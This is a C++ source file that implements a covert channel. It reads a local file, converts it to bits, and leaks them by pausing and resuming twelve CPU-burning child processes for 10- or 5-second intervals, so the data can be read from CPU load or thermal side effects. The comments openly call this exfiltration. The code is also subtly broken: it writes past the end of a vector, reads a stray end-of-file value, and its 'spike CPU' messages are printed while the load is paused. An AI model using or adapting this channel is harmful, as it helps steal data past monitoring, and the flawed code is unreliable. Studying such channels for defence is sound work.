#include <iostream>
#include <fstream>
#include <string>
#include <bitset>
#include <cstring>


#include <thread>
#include <vector>
#include <utility>
#include <algorithm>
#include <iterator>
#include <functional>
#include <mutex>
#include <future>
#include <chrono>

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <ctime>
#include <sys/wait.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#define NUM_OF_CORES 12
#define MAX_PRIME 1000000

using namespace std;


void primes();
void sigusr_handler(int signum);
void start(vector<int> bits);

int main(){
  string myString = "";
  string line;
  ifstream infile("file.txt");//open the file we're interested in
  if (infile.is_open()){
    while (getline(infile,line)){
      myString = myString + line;//save the content into the myString variable
    }
    infile.close();//close the file
  }
  ofstream outfile;
  outfile.open("out.bin");//open the file we will use for exfiltration later
  for (std::size_t i = 0; i < myString.size(); ++i){ //convert text to binary ready for exfiltration

    //implement error correction here
    //BCH(16,12) ??

      outfile << bitset<8>(myString.c_str()[i]);//write the binary into the file out.bin
    }
  outfile.close();//close the binary file

  //move content of out.bin into a vector
   string filename("out.bin");
   vector<int> bytes{};
   FILE* input_file = fopen(filename.c_str(), "r");
   if (input_file == nullptr){
     return EXIT_FAILURE;
   }
   unsigned char character = 0;
   int cursor = 0;
   while (!feof(input_file)){
     character = getc(input_file);
     //bytes[cursor] = character;
     //cout << "file content: " << character;
     int character2 = character - '0';
     bytes.push_back(character2);
     //cout << "; bytes content: " << bytes[cursor] << endl;
     cursor++;
   }
   bytes[cursor] = '\0';
   cout << endl;
   // Print all elements in vector to double check
   std::copy(  bytes.begin(),
               bytes.end(),
               std::ostream_iterator<int>(std::cout," "));
   std::cout<<std::endl;

// all good up to this point
start(bytes);
return 0;

}
//calculate prime numbers
void primes()
{
    unsigned long i, num, primes = 0;
    cout << "process id " << getpid() << " group id :"<< getgid() << "\n";
    for (num = 1; num <= MAX_PRIME; num++) {
        for (i = 2; (i <= num) && (num % i != 0); i++);
        if (i == num)
            primes++;
    }
    printf("Calculated %d primes.\n", primes);
}

//Register the signal handler for child processes
//If SIGUSR1 is received, pause the process,
//and if SIGUSR2 is received, continue normal operation

void sigusr_handler(int signum)
{
    time_t t = std::time(0);
    tm* now = localtime(&t);
    if (signum == SIGUSR1) {    //signalled to pause
        cout<< "I am process with PID: " << getpid() << " killed at " << asctime(now);
        pause();
    }
    else if(signum == SIGUSR2) {    //signalled to resume
        cout<< "I am process with PID: " << getpid() << " resumed at " << asctime(now);
    }
}

//Takes the bits vector containing 1s and 0s
//Creates child processes, and pauses every child for each 1 and 0 bit
//After all bits are processed, kills all the child processes

void start(vector<int> bits)
{
    int num_bits = bits.size();

    pid_t child_pids[NUM_OF_CORES];   //array of pids of processes being started

    //create child processes using fork()
    for(int i = 0; i < NUM_OF_CORES; i++) {
        child_pids[i] = fork();
        pid_t PID = child_pids[i];
        if(PID == 0)    // child[i]
        {
            signal(SIGUSR1, sigusr_handler);    //register signal handler for pausing on SIGUSR1
            signal(SIGUSR2, sigusr_handler);    //register signal handler for resuming on SIGUSR2
            while(1) {      //until signal comes, keep looping
                primes(); //overload CPU cores
            }
        }
        else if(PID<0)
        {       //error forking
            cout<<"Error occured while forking process no: " << i+1 <<endl;
            exit(1);
        }
    }
    //parent process sleeps initially for half second to let child's signal handlers get registered
    //One Process to rule them all, One Process to find them,
    //One Process to bring them all, and in the darkness bind them
    usleep(0.5 * 1e6);
    int i;
    for(i = 0; i < num_bits; i++) {
        int b = bits[i];
        if(b == 1) {    //pause for every 1 bit
            for(pid_t pid : child_pids) {
                kill(pid, SIGUSR1);
                cout << "spike CPU for 10 seconds" << endl;

            }
            usleep(10 * 1e6);
            for(pid_t pid : child_pids) {
                kill(pid, SIGUSR2);
            }
        }
        else if(b == 0) { //pause for every 0 bit
            for(pid_t pid : child_pids) {
                kill(pid, SIGUSR1);
                cout << "spike CPU for 5 seconds" << endl;
            }
            usleep(5 * 1e6);
            for(pid_t pid : child_pids) {
                kill(pid, SIGUSR2);
            }
        }
        //take a break for 1s to allow signals to be delivered
        usleep(1 * 1e6);
    }
    //after all bits, kill/terminate all child processes
    usleep(5 * 1e6);
    for(pid_t pid : child_pids) {
        kill(pid, SIGTERM);
    }
}
